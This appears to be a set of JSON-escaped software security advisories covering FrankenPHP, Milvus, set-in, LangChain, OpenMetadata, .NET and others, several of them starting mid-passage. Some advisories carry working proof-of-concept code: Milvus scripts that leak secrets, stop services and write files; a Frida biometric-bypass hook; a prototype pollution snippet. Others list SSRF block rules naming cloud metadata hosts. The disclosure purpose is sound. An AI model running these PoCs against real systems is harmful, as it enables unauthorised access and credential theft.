          "html": "### Summary\n\nFrankenPHP’s CGI path splitting logic improperly handles Unicode characters during case conversion. The logic computes the split index (for finding `.php`) on a lowercased copy of the request path but applies that byte index to the original path.\n\nBecause `strings.ToLower()` in Go can increase the byte length of certain UTF-8 characters (e.g., `Ⱥ` expands when lowercased), the computed index may not align with the correct position in the original string. This results in an incorrect `SCRIPT_NAME` and `SCRIPT_FILENAME`, potentially causing FrankenPHP to execute a file other than the one intended by the URI.\n\n### **Details**\n\nThe vulnerability resides in the `splitPos()` function and its usage within `splitCgiPath()`. The logic attempts to find the script extension (e.g., `.php`) in a case-insensitive manner by lowercasing the path:\n\n```go\nlowerPath := strings.ToLower(path)\nidx := strings.Index(lowerPath, strings.ToLower(split))\nreturn idx + len(split)\n```\n\nThe issue is that the returned `idx` represents a byte offset within `lowerPath`. However, `splitCgiPath()` uses this index to slice the **original** `path`:\n\n```go\nfc.docURI = path[:splitPos]\nfc.pathInfo = path[splitPos:]\nfc.scriptName = strings.TrimSuffix(path, fc.pathInfo)\nfc.scriptFilename = sanitizedPathJoin(fc.documentRoot, fc.scriptName)\n```\n\nThis logic relies on the assumption that `len(strings.ToLower(path)) == len(path)`. This assumption is false for certain Unicode characters. For example, the character `Ⱥ` (U+023A) requires 2 bytes in UTF-8 (`0xC8 0xBA`), but its lowercase equivalent `ⱥ` (U+2C65) requires 3 bytes (`0xE2 0xB1 0xA5`).\n\nIf the path contains such characters before the `.php` extension, the index calculated on `lowerPath` will be larger than the corresponding visual point in the original `path`. When applied to the original path, the split occurs at the wrong byte offset. This can cause the server to treat a larger portion of the path as the script name, effectively allowing an attacker to manipulate `SCRIPT_FILENAME`.\n\n### **PoC**\n\nThe following Go program demonstrates the discrepancy between the byte index in the lowercased string versus the original string.\n\n1. Save the following as `poc.go`:\n\n```go\npackage main\n\nimport (\n    \"fmt\"\n    \"strings\"\n)\n\nfunc splitPos(path string, split string) int {\n    lowerPath := strings.ToLower(path)\n    idx := strings.Index(lowerPath, strings.ToLower(split))\n    if idx < 0 {\n        return -1\n    }\n    return idx + len(split)\n}\n\nfunc main() {\n    // U+023A: Ⱥ (UTF-8: C8 BA). Lowercase is ⱥ (UTF-8: E2 B1 A5), longer in bytes.\n    // We construct a path where the byte expansion shifts the index.\n    path := \"/ȺȺȺȺshell.php.txt.php\"\n    split := \".php\"\n\n    pos := splitPos(path, split)\n\n    fmt.Printf(\"orig bytes=%d\\n\", len(path))\n    fmt.Printf(\"lower bytes=%d\\n\", len(strings.ToLower(path)))\n    fmt.Printf(\"splitPos=%d\\n\", pos)\n\n    // Current Unsafe Behavior:\n    fmt.Printf(\"orig[:pos] (Calculated Script)=%q\\n\", path[:pos])\n    fmt.Printf(\"orig[pos:] (Calculated PathInfo)=%q\\n\", path[pos:])\n\n    // Expected Safe Behavior:\n    want := strings.Index(path, split) + len(split)\n    fmt.Printf(\"expected splitPos=%d\\n\", want)\n    fmt.Printf(\"expected orig[:]=%q\\n\", path[:want])\n}\n```\n\n2. Run the PoC:\n\n```console\ngo run poc.go\n```\n\n3. **Output:**\n\n```text\norig bytes=26\nlower bytes=30\nsplitPos=22\norig[:pos]=\"/ȺȺȺȺshell.php.txt\"\norig[pos:]=\".php\"\nexpected splitPos=18\nexpected orig[:]=\"/ȺȺȺȺshell.php\"\n```\n\nIn this example, FrankenPHP would identify `/ȺȺȺȺshell.php.txt` as the PHP script to execute, ignoring the fact that the actual file extension in the file system might be `.txt`.\n\n### Impact*\n\nThis is a **Security Boundary Bypass** and **Path Confusion** vulnerability.\n\nIn setups where users can upload files (e.g., avatars, text files) that are stored within the document root or a reachable path, an attacker can upload a file containing malicious PHP code with a safe extension (e.g., `payload.txt`). By crafting a request with specific Unicode characters, the attacker can force FrankenPHP to calculate the `SCRIPT_FILENAME` as ending in `payload.txt`, while the request appears to contain `.php` to the internal router logic.\n\nThis results in the execution of non-PHP files as PHP scripts, leading to **Remote Code Execution (RCE)**.\n\n### **Patched Versions**\n\n* This issue is fixed in FrankenPHP version **1.11.2**.\n\n### **Workarounds**\n\n* Ensure that user-uploaded files are stored outside of the public document root.\n* Implement strict WAF rules to reject requests containing specific multi-byte Unicode characters in the URL path if an upgrade is not immediately possible.",

This allows a subsequent request processed by the same worker to access the `$_SESSION` data of the previous request (potentially belonging to a different user) before `session_start()` is called.\n\n### Details\n\nIn standard PHP execution, the environment is torn down completely after every request. In FrankenPHP's worker mode, the application stays in memory, and superglobals are manually reset between requests.\n\nThe vulnerability exists because `$_SESSION` is stored in the Zend Engine's symbol table (`EG(symbol_table)`). While the standard PHP request shutdown (RSHUTDOWN) decrements the reference count of the session data, it does not remove the `$_SESSION` variable itself from the symbol table. FrankenPHP's reset logic (`frankenphp_reset_super_globals`) previously cleared other superglobals but failed to explicitly delete `$_SESSION`.\n\nConsequently, until `session_start()` is called in the new request (which re-initializes the variable), the `$_SESSION` array retains the data from the previous request processed by that specific worker thread.\n\n### Impact\n\nThis is a **cross-request data leakage** vulnerability.\n\n* **Confidentiality:** If an application reads `$_SESSION` before calling `session_start()`, it can access sensitive information (authentication tokens, user IDs, PII) belonging to the previous user.\n* **Logic Errors / Impersonation:** If application logic relies on `$_SESSION` being empty or unset to detect a \"guest\" state, or checks for specific keys in `$_SESSION` prior to session initialization, a malicious actor (or accidental race condition) could trigger privilege escalation or user impersonation.\n\nThis affects only users running FrankenPHP in **worker mode** and not `session_start()` for each request, which is done by default by most frameworks.\n\n### PoC\n\nThe following steps demonstrate the issue (derived from the regression tests added in the fix):\n\n1. **Client A** sends a request that starts a session and sets sensitive data:\n\n```php\n// Request 1\nsession_start();\n$_SESSION['secret'] = 'AliceData';\nsession_write_close();\n```\n\n2. **Client B** (or the same client without cookies) sends a request to the same worker. This script checks `$_SESSION` *without* starting a session:\n\n```php\n// Request 2\n// session_start() is NOT called\nif (!empty($_SESSION)) {\n    echo \"Leaked Data: \" . $_SESSION['secret'];\n}\n```\n\n\n3. **Result:** Client B receives \"Leaked Data: AliceData\".\n\n### Workarounds\n\n* Ensure `session_start()` is called immediately at the entry point of your worker script to overwrite any residual data (though this may not cover all edge cases if middleware runs before the controller).\n* Manually unset `$_SESSION` at the very beginning of the worker loop, before handling the request.",

          "html": "## Summary\n\nMilvus exposes TCP port 9091 by default with two critical authentication bypass vulnerabilities:\n\n1. The `/expr` debug endpoint uses a weak, predictable default authentication token derived from `etcd.rootPath` (default: `by-dev`), enabling arbitrary expression evaluation.\n2. The full REST API (`/api/v1/*`) is registered on the metrics/management port without any authentication, allowing unauthenticated access to all business operations including data manipulation and credential management.\n\n## Details\n\n### Vulnerability 1: Weak Default Authentication on `/expr` Endpoint\n\nThe `/expr` endpoint on port 9091 accepts an `auth` parameter that defaults to the `etcd.rootPath` value (`by-dev`). This value is well-known and predictable. An attacker who can reach port 9091 can evaluate arbitrary internal Go expressions, leading to:\n\n- **Information/Credential Disclosure**: Reading internal configuration values (MinIO secrets, etcd credentials) and user credential hashes via `param.MinioCfg.SecretAccessKey.GetValue()`, `rootcoord.meta.GetCredential(ctx, 'root')`, etc.\n- **Denial of Service**: Invoking `proxy.Stop()` to shut down the proxy service.\n- **Arbitrary File Write (potential RCE)**: Manipulating access log configuration parameters to write arbitrary content to arbitrary file paths on the server filesystem.\n\n### Vulnerability 2: Unauthenticated REST API on Metrics Port\n\nBusiness-logic HTTP handlers (collection management, data insertion, credential management) are registered on the metrics/management HTTP server at port 9091 via `registerHTTPServer()` in [`internal/distributed/proxy/service.go` (line 170)](https://github.com/milvus-io/milvus/blob/9996e8d1cebff7e7108bcb16d43124236de77438/internal/distributed/proxy/service.go#L170). These endpoints do not enforce any authentication, even when Milvus authentication is enabled on the primary gRPC/HTTP ports.\n\nAn attacker can perform any business operation without credentials, including:\n\n- Creating, listing, and deleting collections\n- Inserting and querying data\n- Creating, listing, and deleting user credentials\n- Modifying user passwords\n\n## Proof of Concept\n\n### PoC 1 — `/expr` Endpoint Exploitation\n\n```python\nimport requests\n\nurl = \"http://<target>:9091/expr\"\n\n# Leak sensitive configuration (e.g., MinIO secret key)\nres = requests.get(url, params={\n    \"auth\": \"by-dev\",\n    \"code\": \"param.MinioCfg.SecretAccessKey.GetValue()\"\n}, timeout=5)\nprint(res.json().get(\"output\", \"\"))\n\n# Retrieve hashed credentials for the root user\nres = requests.get(url, params={\n    \"auth\": \"by-dev\",\n    \"code\": \"rootcoord.meta.GetCredential(ctx, 'root')\"\n}, timeout=5)\nprint(res.json().get(\"output\", \"\"))\n\n# Denial of Service — stop the proxy\nres = requests.get(url, params={\n    \"auth\": \"by-dev\",\n    \"code\": \"proxy.Stop()\"\n}, timeout=5)\n\n# Arbitrary file write (potential RCE)\nfor cmd in [\n    'param.Save(\"proxy.accessLog.localPath\", \"/tmp\")',\n    'param.Save(\"proxy.accessLog.formatters.base.format\", \"whoami\")',\n    'param.Save(\"proxy.accessLog.filename\", \"evil.sh\")',\n    'querycoord.etcdCli.KV.Put(ctx, \"by-dev/config/proxy/accessLog/enable\", \"true\")'\n]:\n    requests.get(url, params={\"auth\": \"by-dev\", \"code\": cmd}, timeout=5)\n```\n\n### PoC 2 — Unauthenticated REST API Access\n\n```python\nimport requests\n\ntarget_url = \"http://<target>:9091\"\n\n# Create a user without any authentication\nres = requests.post(f\"{target_url}/api/v1/credential\", json={\n    \"username\": \"attacker_user\",\n    \"password\": \"MTIzNDU2Nzg5\",\n})\nprint(res.json())\n\n# List all users\nres = requests.get(f\"{target_url}/api/v1/credential/users\")\nprint(res.json())  # {'status': {}, 'usernames': ['root', 'attacker_user']}\n\n# Create and delete collections, insert data — all without authentication\n```\n\n## Internet Exposure\n\nA significant number of publicly exposed Milvus instances are discoverable via internet-wide scanning using the pattern:\n\n```\nhttp.body=\"404 page not found\" && port=\"9091\"\n```\n\nThis indicates the vulnerability is actively exploitable in real-world production environments.\n\n## Impact\n\nAn unauthenticated remote attacker with network access to port 9091 can:\n\n1. **Exfiltrate secrets and credentials** — MinIO keys, etcd credentials, user password hashes, and all internal configuration values.\n2. **Manipulate all data** — Create, modify, and delete collections, insert or remove data, bypassing all application-level access controls.\n3. **Manage user accounts** — Create administrative users, reset passwords, and escalate privileges.\n4. **Cause denial of service** — Shut down proxy services, drop databases, or corrupt metadata.\n5. **Write arbitrary files** — Potentially achieve remote code execution by writing malicious files to the filesystem via access log configuration manipulation.\n\n## Remediation\n\n### Recommended Fixes\n\n1. **Remove or disable the `/expr` endpoint** in production builds. If retained for debugging, it must require strong, non-default authentication and be disabled by default.\n2. **Do not register business API routes on the metrics port.** Separate the metrics/health endpoints from the application REST API to ensure authentication middleware applies consistently.\n3. **Bind port 9091 to localhost by default** (`127.0.0.1:9091`) so it is not externally accessible unless explicitly configured.\n4. **Enforce authentication on all API endpoints**, regardless of which port they are served on.\n\n### User Mitigations (until patched)\n\n- Block external access to port 9091 using firewall rules or network policies.\n- If running in Docker/Kubernetes, do not expose port 9091 outside the internal network.\n- Change the `etcd.rootPath` from the default value `by-dev` to a strong, random value (partial mitigation only — does not address the unauthenticated REST API).\n\n## Credit\n\nThis vulnerability was discovered and responsibly reported by **YingLin Xie** (xieyinglin@hust.edu.cn). It was independently reported by [0x1f](https://github.com/0x1f) and zznQ ([ac0d3r](https://github.com/ac0d3r)).",

Despite a previous fix that attempted to mitigate prototype pollution by checking whether user input contained a forbidden key, it is still possible to pollute Object.prototype via a crafted input using Array.prototype. This has been fixed in version 2.0.5.\n\n### Details\nThe vulnerability resides in line 28 of https://github.com/ahdinosaur/set-in/blob/master/index.js where includes() function is used to check whether user provided input contain forbidden strings.\n\n### PoC\n#### Steps to reproduce\n1. Install latest version of set-in using npm install or cloning from git\n2. Run the following code snippet:\n\n```javascript\nArray.prototype.includes = () => false; \nconst si = require('set-in');\nconst obj = {};\nconsole.log({}.polluted);\nsi(obj, [\n    'constructor',\n    'prototype',\n    'polluted'\n], 'yes');\nconsole.log('{ ' + obj.polluted + ', ' + 'yes' + ' }');  // prints yes -> indicating that the patch was bypassed and prototype pollution occurred\n```\n\n#### Expected behavior\nPrototype pollution should be prevented and {} should not gain new properties.\nThis should be printed on the console:\n```\nundefined\nundefined OR throw an Error\n```\n\n#### Actual behavior\nObject.prototype is polluted\nThis is printed on the console:\n```\nundefined \nyes\n```\n\n### Impact\nThis is a prototype pollution vulnerability, which can have severe security implications depending on how set-in is used by downstream applications. Any application that processes attacker-controlled input using this package may be affected.\nIt could potentially lead to the following problems:\n1. Authentication bypass\n2. Denial of service\n3. Remote code execution (if polluted property is passed to sinks like eval or child_process)",

Its `preventOutside` option (enabled by default) is intended to restrict crawling to the same site as the base URL.\n\nThe implementation used `String.startsWith()` to compare URLs, which does not perform semantic URL validation. An attacker who controls content on a crawled page could include links to domains that share a string prefix with the target (e.g., `https://example.com.attacker.com` passes a `startsWith` check against `https://example.com`), causing the crawler to follow links to attacker-controlled or internal infrastructure.\n\nAdditionally, the crawler performed no validation against private or reserved IP addresses. A crawled page could include links targeting cloud metadata services (`169.254.169.254`), localhost, or RFC 1918 addresses, and the crawler would fetch them without restriction.\n\n## Impact\n\nAn attacker who can influence the content of a page being crawled (e.g., by placing a link on a public-facing page, forum, or user-generated content) could cause the crawler to:\n\n- Fetch cloud instance metadata (AWS, GCP, Azure), potentially exposing IAM credentials and session tokens\n- Access internal services on private networks (`10.x`, `172.16.x`, `192.168.x`)\n- Connect to localhost services\n- Exfiltrate response data via attacker-controlled redirect chains\n\nThis is exploitable in any environment where `RecursiveUrlLoader` runs on infrastructure with access to cloud metadata or internal services — which includes most cloud-hosted deployments.\n\n## Resolution\n\nTwo changes were made:\n\n1. **Origin comparison replaced.** The `startsWith` check was replaced with a strict origin comparison using the URL API (`new URL(link).origin === new URL(baseUrl).origin`). This correctly validates scheme, hostname, and port as a unit, preventing subdomain-based bypasses.\n\n2. **SSRF validation added to all fetch operations.** A new URL validation module (`@langchain/core/utils/ssrf`) was introduced and applied before every outbound fetch in the crawler. This blocks requests to:\n   - **Cloud metadata endpoints:** `169.254.169.254`, `169.254.170.2`, `100.100.100.200`, `metadata.google.internal`, and related hostnames\n   - **Private IP ranges:** `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`, `169.254.0.0/16`\n   - **IPv6 equivalents:** `::1`, `fc00::/7`, `fe80::/10`\n   - **Non-HTTP/HTTPS schemes** (`file:`, `ftp:`, `javascript:`, etc.)\n\nCloud metadata endpoints are unconditionally blocked and cannot be overridden.\n\n## Workarounds\n\nUsers who cannot upgrade immediately should avoid using `RecursiveUrlLoader` on untrusted or user-influenced content, or should run the crawler in a network environment without access to cloud metadata or internal services.",

This allows attackers to trigger Server-Side Request Forgery (SSRF) attacks by providing malicious image URLs in user input.\n\n### Severity\n**Low** - The vulnerability allows SSRF attacks but has limited impact due to:\n- Responses are not returned to the attacker (blind SSRF)\n- Default 5-second timeout limits resource exhaustion\n- Non-image responses fail at PIL image parsing\n\n### Impact\nAn attacker who can control image URLs passed to `get_num_tokens_from_messages()` can:\n- Trigger HTTP requests from the application server to arbitrary internal or external URLs\n- Cause the server to access internal network resources (private IPs, cloud metadata endpoints)\n- Cause minor resource consumption through image downloads (bounded by timeout)\n\n**Note:** This vulnerability occurs during token counting, which may happen outside of model invocation (e.g., in logging, metrics, or token budgeting flows).\n\n### Details\nThe vulnerable code path:\n1. `get_num_tokens_from_messages()` processes messages containing `image_url` content blocks\n2. For images without `detail: \"low\"`, it calls `_url_to_size()` to fetch the image and compute token counts\n3. `_url_to_size()` performs `httpx.get(image_source)` on any URL without validation\n4. Prior to the patch, there was no SSRF protection, size limits, or explicit timeout\n\n**File:** `libs/partners/openai/langchain_openai/chat_models/base.py`\n\n### Patches\nThe vulnerability has been patched in `langchain-openai==1.1.9` (requires `langchain-core==1.2.11`).\n\nThe patch adds:\n1. **SSRF validation** using `langchain_core._security._ssrf_protection.validate_safe_url()` to block:\n   - Private IP ranges (RFC 1918, loopback, link-local)\n   - Cloud metadata endpoints (169.254.169.254, etc.)\n   - Invalid URL schemes\n2. **Explicit size limits** (50 MB maximum, matching OpenAI's payload limit)\n3. **Explicit timeout** (5 seconds, same as `httpx.get` default)\n4. **Allow disabling image fetching** via `allow_fetching_images=False` parameter\n\n### Workarounds\nIf you cannot upgrade immediately:\n\n1. **Sanitize input:** Validate and filter `image_url` values before passing messages to token counting or model invocation\n2. **Use network controls:** Implement egress filtering to prevent outbound requests to private IPs",

          "html": "### Summary\nCalls issued by the UI against `/api/v1/ingestionPipelines` leak JWTs used by `ingestion-bot` for certain services (Glue / Redshift / Postgres)\n\n### Details\nAny read-only user can gain access to a highly privileged account, typically which has the Ingestion Bot Role. This enables destructive changes in OpenMetadata instances, and potential data leakage (e.g. sample data, or service metadata which would be unavailable per roles/policies). \n\n\n### PoC\nI was able to extract the JWT used by the bot/agent populating [sample_athena.default](https://sandbox.open-metadata.org/database/sample_athena.default) in the Collate Sandbox. To prove this out, I mutated the description to this UUID: `fe2e4cc1-da72-4acf-8535-112a3cfa9c7e,` which you can see  @ https://sandbox.open-metadata.org/database/sample_athena.default.\n\n#### Steps to Reproduce\n\n* Create a Collate Sandbox account; these are non-admin accounts by default with minimal permissions.\n* Open the Developer Console\n* Go to the Services Page. In this case, [sample_athena](https://sandbox.open-metadata.org/service/databaseServices/sample_athena?showDeletedTables=false&currentPage=1), though other services \n* In the Network tab, introspect the request made to api/v1/services/ingestionPipelines, and find the jwtToken in the response:\n<img width=\"1329\" height=\"299\" alt=\"image\" src=\"https://github.com/user-attachments/assets/0c405776-159e-4188-9591-ed8cc71bc596\" />\n\n* Use the JWT to issue (potentially destructive) API calls\n<img width=\"3024\" height=\"1798\" alt=\"image\" src=\"https://github.com/user-attachments/assets/ab40b528-4d2b-404b-8f8a-482a1693e179\" />\n\n* Resulting mutated description:\n<img width=\"622\" height=\"399\" alt=\"image\" src=\"https://github.com/user-attachments/assets/3fa630ff-93b5-4b7d-8e3c-220f8a84a23a\" />\n\nNote that this is also the case for these services, among others:\n* [acme_nexus_redshift](https://sandbox.open-metadata.org/service/databaseServices/acme_nexus_redshift) \n* [sample_postgres](https://sandbox.open-metadata.org/service/databaseServices/sample_postgres)\n\n### Proposed Remediation\nRedact jwtToken in API payload.\nImplement role-based filtering - Only return JWT tokens to users with explicit admin/service account permissions\n(for Admins) Rotate Ingestion Bot Tokens in affected environments\n\n### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\n* Vulnerability Type: Privilege Escalation\n* Risk: User impersonation, even for those with read-only access, can lead to destructive outcomes if malicious actors leverage the leaked JWT.",

This advisory also provides guidance on what developers can do to update their applications to remove this vulnerability.\n\nAn attacker could exploit this vulnerability by crafting a malicious payload that bypasses the security checks in the affected System.Security.Cryptography.Cose versions, potentially leading to unauthorized access or data manipulation.\n\n## Announcement\n\nAnnouncement for this issue can be found at https://github.com/dotnet/announcements/issues/380\n\n## <a name=\"mitigation-factors\"></a>Mitigation factors\n\nIf your application does not use System.Security.Cryptography.Cose it is not affected. By default, no .NET applications reference this component.\n\n## <a name=\"affected-packages\"></a>Affected Packages\nThe vulnerability affects any Microsoft .NET project if it uses any of affected packages versions listed below\n\n### <a name=\".NET 10\"></a>.NET 10\nPackage name | Affected version | Patched version\n------------ | ---------------- | -------------------------\n[System.Security.Cryptography.Cose](https://www.nuget.org/packages/System.Security.Cryptography.Cose)               | >= 10.0.0, < 10.0.2 | 10.0.3\n\n### <a name=\".NET 9\"></a>.NET 9\nPackage name | Affected version | Patched version\n------------ | ---------------- | -------------------------\n[System.Security.Cryptography.Cose](https://www.nuget.org/packages/System.Security.Cryptography.Cose)               | >= 9.0.0, < 9.0.12 | 9.0.13\n\n### <a name=\".NET 8\"></a>.NET 8\nPackage name | Affected version | Patched version\n------------ | ---------------- | -------------------------\n[System.Security.Cryptography.Cose](https://www.nuget.org/packages/System.Security.Cryptography.Cose)               | >= 8.0.0, < 8.0.1 | 8.0.2\n\n## Advisory FAQ\n\n### <a name=\"how-affected\"></a>How do I know if I am affected?\n\nIf an affected package listed in [affected software](#affected-software) or [affected packages](#affected-packages), you're exposed to the vulnerability.\n\n### <a name=\"how-fix\"></a>How do I fix the issue?\n\nTo update the Using the System.Security.Cryptography.Cose NuGet package, use one of the following methods:\n\nNuGet Package Manager UI in Visual Studio:\n- Open your project in Visual Studio.\n- Right-click on your project in Solution Explorer and select \"Manage NuGet Packages...\" or navigate to \"Project > Manage NuGet Packages\".\n- In the NuGet Package Manager window, select the \"Updates\" tab. This tab lists packages with available updates from your configured package sources.\n- Select the package(s) you wish to update. You can choose a specific version from the dropdown or update to the latest available version.\n- Click the \"Update\" button.\n\nUsing the NuGet Package Manager Console in Visual Studio:\n- Open your project in Visual Studio.\n- Navigate to \"Tools > NuGet Package Manager > Package Manager Console\".\n- To update a specific package to its latest version, use the following Update-Package command:\n\n```\nUpdate-Package -Id System.Security.Cryptography.Cose\n```\n\nUsing the .NET CLI (Command Line Interface):\n- Open a terminal or command prompt in your project's directory.\n- To update a specific package to its latest version, use the following add package command:\n\n```\ndotnet add package System.Security.Cryptography.Cose\n```\n\nOnce you have updated the nuget package reference you must recompile and deploy your application. Additionally we recommend you update your runtime and/or SDKs, but it is not necessary to patch the vulnerability.\n\n## Other Information\n\n### Reporting Security Issues\n\nIf you have found a potential security issue in a supported version of .NET, please report it to the Microsoft Security Response Center (MSRC) via the [MSRC Researcher Portal](https://msrc.microsoft.com/report/vulnerability/new).

This can lead to security issues in various situations, such as the most commonly used signature verification (ECDSA) and shared key negotiation (ECDH). When the victim computes the shared secret as `S = [victim_private_key]P` via ECDH,  this leaks information about `victim_private_key mod (small_subgroup_order)`. For curves with cofactor > 1, this reveals the least significant bits of the private key.  When these weak public keys are used in ECDSA , it's easy to forge signatures on the small subgroup.\n\nOnly SECT curves are impacted by this.\n\n## Credit\n\nThis vulnerability was discovered by:\n- XlabAI Team of Tencent Xuanwu Lab\n- Atuin Automated Vulnerability Discovery Engine",

          "html": "There is a potential issue with the [cap-go/capacitor-native-biometric](https://github.com/Cap-go/capacitor-native-biometric) library. \n\n---\n\n## Summary\n\nThe [cap-go/capacitor-native-biometric](https://github.com/Cap-go/capacitor-native-biometric) library was found to be subject to an authentication bypass as the current implementation of the `onAuthenticationSucceeded()` does not appear to handle a `CryptoObject`[^HackTricks1] [^SecuringBiometricAuthentication] as seen in the following code block starting from [line 88 in AuthActivity.java](https://github.com/Cap-go/capacitor-native-biometric/blob/main/android/src/main/java/ee/forgr/biometric/AuthActivity.java#L88):\n\n```java\n@Override\n    public void onAuthenticationSucceeded(\n        @NonNull BiometricPrompt.AuthenticationResult result\n    ) {\n        super.onAuthenticationSucceeded(result);\n        finishActivity(\"success\");\n    }\n```\n\nAs the current implementation only checks whether `onAuthenticationSucceeded()` was called and does not handle a `CryptoObject` the biometric authentication can be bypassed by hooking the `onAuthenticationSucceeded()` function. \n\n## PoC Video:\n\nhttps://github.com/user-attachments/assets/b7b5a2bc-21dc-4373-b371-84b002dae7a7\n\n## Environment:\n\nThe following steps were taken to create and deploy a Capacitor application using the `cap-go/capacitor-native-biometric library` for the purpose of verifying this finding. Note at the time of writing the `npx create-react-app` command broke, so I have provided two ways of creating and deploying the testing environment. Apparently React updated to version 19 caused a dependency issue as seen [here](https://github.com/facebook/create-react-app/issues/13715). If it is not fixed by the time you look at this PoC please use the yarn alternatives. \n\n1. Create a new Capacitor app by opening your terminal and run the following commands to create a new Capacitor app. For the sake of the disclosure I'll be using the name `capgo-poc`: \n\n```sh\nnpx create-react-app capgo-poc --template typescript\n```\n\nYarn Alternative:\n\n```sh\nnpm install --global yarn\nyarn create react-app capgo-poc --template typescript\n```\n\n2. Install dependencies by navigating into your app's directory and run the following command to install Capacitor's core dependencies:\n\n```sh\ncd capgo-poc\nnpm install @capacitor/core \nnpm install @capacitor/cli \nnpm install @capacitor/android\nnpm install @capgo/capacitor-native-biometric\nnpm install react\n```\n\nYarn Alternative:\n\n```sh\ncd capgo-poc\nyarn add @capacitor/core \nyarn add @capacitor/cli \nyarn add @capacitor/android\nyarn add @capgo/capacitor-native-biometric\nyarn add react\n```\n\n3. Initialise the project using the name `capgo-poc` and `com.capgo.poc`, and add the android platform by running the following commands:\n\n```sh\nnpx cap init\nnpx cap add android\n```\n\n4. Configure the android permissions by opening the `android/app/src/main/AndroidManifest.xml` file and add the necessary permissions:\n\n```xml\n<uses-permission android:name=\"android.permission.USE_BIOMETRIC\" />\n<uses-permission android:name=\"android.permission.USE_FINGERPRINT\" />\n```\n\n5. Implement Biometric Authentication, here is some basic code to use the biometric authentication feature. Modify the TSX file called `App.tsx` in `src/` and import the following code:\n\n```js\nimport React, { useState } from 'react';\nimport { NativeBiometric } from '@capgo/capacitor-native-biometric';\n\nconst App = () => {\n  // State to hold authentication status\n  const [authStatus, setAuthStatus] = useState<string | null>(null);\n\n  // Function to authenticate the user\n  const authenticateUser = async () => {\n    try {\n      const result = await NativeBiometric.verifyIdentity({\n        reason: 'For an application access',\n        title: 'Log in',\n        subtitle: '',\n        description: 'Verify yourself by biometrics',\n        useFallback: true,\n        maxAttempts: 3,\n      }).then(() => true)\n        .catch(() => false);\n\n      if (!result) {\n        setAuthStatus('failed');\n      } else {\n        setAuthStatus('success');\n      }\n    } catch (error) {\n      console.error('Error during biometric verification:', error);\n      setAuthStatus('error');\n    }\n  };\n\n  return (\n    <div>\n      <h1>CAP-GO Capacitor Native Biometric Authentication</h1>\n      <button onClick={authenticateUser}>Authenticate with Biometrics</button>\n\n      {/* Conditionally render based on authentication status */}\n      {authStatus === 'success' && <h2>CAP-GO Capacitor Native Biometric Authentication Success</h2>}\n      {authStatus === 'failed' && <h2>CAP-GO Capacitor Native Biometric Authentication Failed</h2>}\n      {authStatus === 'error' && <h2>Error during authentication</h2>}\n    </div>\n  );\n};\n\nexport default App;\n```\n\n6. Build the React project, synchronise it with the Android platform, and open the native Android project in Android Studio by running the following commands:\n\n```sh\nnpm run build\nnpx cap sync android \nnpx cap open android\n```\n\nYarn alternative:\n\n```sh\nyarn build\nnpx cap sync android \nnpx cap open android\n```\n\n## Exploitation:\n\nFor the purpose of demonstrating the vulnerability we will be using frida and a rooted emulator from android studio. Frida is a dynamic instrumentation toolkit used as part of pentesting mobile applications [^frida]. \n\nNote that a rooted emulator is not necessary, but is being used for simplicity to demonstrate the vulnerability. \n\n1. Copy the below frida script to a JavaScript file and run it to hook the `onAuthenticationSucceeded()` function, abusing the `null CryptoObject`. This can be done by running the following command:\n\n```sh\nfrida -U -l <PAYLOAD> -n 'capgo-poc'\n```\n\n### Payload\n```js\nJava.perform(function () {\n  hookBiometricPrompt();\n});\n\nfunction getBiometricAuthResult(resultObj, cryptoInst) {\n    var authenticationResultInst = resultObj.$new(cryptoInst, 0);\n    return authenticationResultInst;\n};\n\nfunction getBiometricPromptResult() {\n    var cryptoObj = Java.use('android.hardware.biometrics.BiometricPrompt$CryptoObject');\n    var cryptoInst = cryptoObj.$new(null);\n    var authenticationResultObj = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');\n    var authenticationResultInst = getBiometricAuthResult(authenticationResultObj, cryptoInst);\n    return authenticationResultInst\n};\n\nfunction hookBiometricPrompt() {\n    var biometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt')['authenticate'].overload('android.os.CancellationSignal', 'java.util.concurrent.Executor', 'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');\n    console.log(\"Hooking BiometricPrompt.authenticate()...\");\n    biometricPrompt.implementation = function (cancellationSignal, executor, callback) {\n        var authenticationResultInst = getBiometricPromptResult();\n        callback.onAuthenticationSucceeded(authenticationResultInst);\n    }\n};\n```\n\n[^SecuringBiometricAuthentication]: https://www.kayssel.com/post/android-8/\n[^HackTricks1]: https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting/bypass-biometric-authentication-android#method-1-bypassing-with-no-crypto-object-usage\n[^frida]: https://frida.re/",

If the underlying LDAP server is configured to allow anonymous\nbinds, an attacker can bypass authentication by providing an existing username with an empty password. This allows unauthorized access to otherwise restricted Druid resources without valid credentials.\n\nThe vulnerability stems from improper validation of LDAP authentication responses when anonymous binds are permitted, effectively treating anonymous bind success as valid user authentication. \n\nImpact\n\nA remote, unauthenticated attacker can:\n  *  Gain unauthorized access to the Apache Druid cluster\n  *  Access sensitive data stored in Druid datasources\n  *  Execute queries and potentially manipulate data\n  *  Access administrative interfaces if the bypassed account has elevated privileges\n  *  Completely compromise the confidentiality, integrity, and availability of the Druid deployment                                                                                                                                                                                    \n\n\nMitigation\n \nImmediate Mitigation (No Druid Upgrade Required):                                                                                                                                                    \n  *  Disable anonymous bind on your LDAP server.

By using nested traversal sequences (e.g., ....//), an attacker can write arbitrary files to the server filesystem, including sensitive directories like runtime/scripts. This leads to Remote Code Execution (RCE) when the server reloads the malicious scripts. It is a new vulnerability a patch bypass for the sanitization in the last release .\n\n\n### Details\nThis report describes a new, distinct vulnerability that differs from previous Path Traversal advisories (such as CVE-2023-31718) in several ways:\n\nPatch Bypass (Regression): The vulnerability circumvents the existing sanitization logic implemented to fix previous traversal issues. The current \"single-pass\" regex approach is insufficient against nested sequences.\nExpansion of Scope: Unlike previous reports that focused primarily on /api/download, this bypass affects multiple critical endpoints, including /api/upload, /api/resources/remove, and /api/logs.\nEscalation to RCE: By targeting the \nupload\n and remove functionalities, this vulnerability directly leads to Remote Code Execution, which is a higher impact than the information disclosure typically associated with previous traversal reports.\n\n\n### Impact\nRemote Code Execution (RCE): Transition from application admin to full system control.\nSCADA Operational Disruption: Potential for physical or operational sabotage by manipulating tags and alarms.\nData Integrity & Availability: Full access to projects, credentials, and historical logs.\n\n### Patches\n\nThis issue has been patched in FUXA version 1.2.11. Users are strongly encouraged to update to the 